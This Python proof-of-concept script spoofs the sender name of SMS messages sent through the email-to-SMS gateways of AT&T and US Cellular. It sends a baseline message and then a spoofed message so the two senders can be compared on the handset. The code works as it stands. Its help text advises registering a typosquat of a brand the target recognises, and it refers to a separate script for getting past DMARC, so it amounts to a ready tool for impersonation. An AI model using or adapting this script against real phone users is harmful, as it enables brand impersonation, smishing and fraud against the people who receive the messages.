#!/usr/bin/env python3
"""
04 — Demonstrate sender spoofing via the From: local-part.

On AT&T (`txt.att.net`) and US Cellular (`email.uscc.net`), the SMS
sender field shown on the handset is derived from the local-part of
the email From: header. This PoC sends two messages back-to-back so
the operator can compare:

  1. From: gmail-like address → sender on handset = ugly email
  2. From: alerts@yourtypoyourdomain.tld → sender on handset = "alerts"

This only spoofs the *name*, not the From: domain. Sending mail with
a From: domain you don't own is a separate DMARC battle and is
covered in pocs/02_direct_to_mx.py.

Run:
    export SMTP_USER="you@gmail.com"
    export SMTP_APP_PW="xxxx xxxx xxxx xxxx"
    python pocs/04_spoofed_from_header.py \\
        --to 2155551234 --carrier att \\
        --spoof-local alerts \\
        --spoof-domain yourtypoyourdomain.tld

    # Then look at your handset. Sender field on iPhone should read
    # "alerts" for the second message.
"""
from __future__ import annotations

import argparse
import os
import smtplib
import sys
from email.message import EmailMessage

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "tools"))
import gateway_domains  # noqa: E402


CARRIERS_WITH_LOCALPART_SENDER = {"att", "uscellular", "cricket"}


def _send(smtp_host, smtp_port, smtp_user, smtp_pass, msg) -> None:
    with smtplib.SMTP(smtp_host, smtp_port, timeout=20) as s:
        s.ehlo()
        s.starttls()
        s.ehlo()
        s.login(smtp_user, smtp_pass)
        s.send_message(msg)


def _build(*, from_addr: str, to_addr: str, body: str, subject: str = "") -> EmailMessage:
    msg = EmailMessage()
    msg["From"] = from_addr
    msg["To"] = to_addr
    msg["Subject"] = subject
    msg.set_content(body)
    return msg


def main(argv: list[str] | None = None) -> int:
    p = argparse.ArgumentParser(description="Compare baseline vs spoofed From: rendering.")
    p.add_argument("--to", required=True)
    p.add_argument("--carrier", required=True,
                   help=f"One of: {', '.join(g.carrier for g in gateway_domains.GATEWAYS)}")
    p.add_argument("--spoof-local", required=True,
                   help="Local-part to surface as the sender on AT&T/US Cellular")
    p.add_argument("--spoof-domain", required=True,
                   help="Domain you control with SPF/DKIM published, "
                        "ideally a typosquat of a brand recognized by the target")
    p.add_argument("--smtp-host", default="smtp.gmail.com")
    p.add_argument("--smtp-port", default=587, type=int)
    p.add_argument("--smtp-user", default=os.environ.get("SMTP_USER"))
    p.add_argument("--smtp-pass", default=os.environ.get("SMTP_APP_PW"))
    p.add_argument("--dry-run", action="store_true")
    args = p.parse_args(argv)

    gw = gateway_domains.by_carrier(args.carrier)
    if not gw or not gw.sms_domain:
        print(f"carrier {args.carrier!r} has no live SMS gateway", file=sys.stderr)
        return 2

    if args.carrier not in CARRIERS_WITH_LOCALPART_SENDER:
        print(f"[warn] carrier {args.carrier!r} does not surface only the local-part. "
              f"The spoofed message will still send but the handset may render the "
              f"full From: address rather than just '{args.spoof_local}'.", file=sys.stderr)

    if not (args.smtp_user and args.smtp_pass) and not args.dry_run:
        print("SMTP_USER and SMTP_APP_PW must be set", file=sys.stderr)
        return 3

    to_addr = f"{args.to}@{gw.sms_domain}"

    baseline_from = args.smtp_user or "noreply@example.invalid"
    spoof_from = f"{args.spoof_local}@{args.spoof_domain}"

    baseline_body = "[baseline] sender should render as your gmail address"
    spoof_body = f"[spoof] sender should render as '{args.spoof_local}'"

    baseline_msg = _build(from_addr=baseline_from, to_addr=to_addr, body=baseline_body)
    spoof_msg = _build(from_addr=spoof_from, to_addr=to_addr, body=spoof_body)

    print(f"[carrier]  {args.carrier} ({gw.sms_domain})")
    print(f"[baseline] From: {baseline_from}")
    print(f"[spoof]    From: {spoof_from}")
    print(f"[note]     for spoof to pass, {args.spoof_domain} must have SPF/DKIM "
          f"covering {args.smtp_host} as a valid sender.")
    print(f"           If you don't own {args.spoof_domain}, see pocs/02_direct_to_mx.py "
          f"for the direct-MX path instead.")

    if args.dry_run:
        print("[dry-run]  not sending")
        return 0

    for label, msg in (("baseline", baseline_msg), ("spoof", spoof_msg)):
        try:
            _send(args.smtp_host, args.smtp_port, args.smtp_user, args.smtp_pass, msg)
            print(f"[ok]       {label} sent")
        except smtplib.SMTPException as e:
            print(f"[fail]     {label} SMTP error: {e}", file=sys.stderr)
            if label == "spoof":
                print(f"           likely cause: provider DMARC rejected spoofed From: domain. "
                      f"Run pocs/02_direct_to_mx.py instead.", file=sys.stderr)

    print("\n[check]    open Messages on your handset. Compare the two senders shown.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
